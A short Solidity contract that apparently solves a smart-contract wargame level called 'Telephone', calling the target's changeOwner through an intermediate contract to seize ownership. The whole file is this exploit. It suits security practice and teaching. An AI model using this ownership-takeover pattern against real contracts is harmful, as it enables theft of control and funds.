// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Telephone{
    function changeOwner(address _owner) external;
}

contract Attack{
    address public target;

    constructor(address _target){
        target = _target;
    }

    function attack() public{
        Telephone(target).changeOwner(msg.sender);
    }
}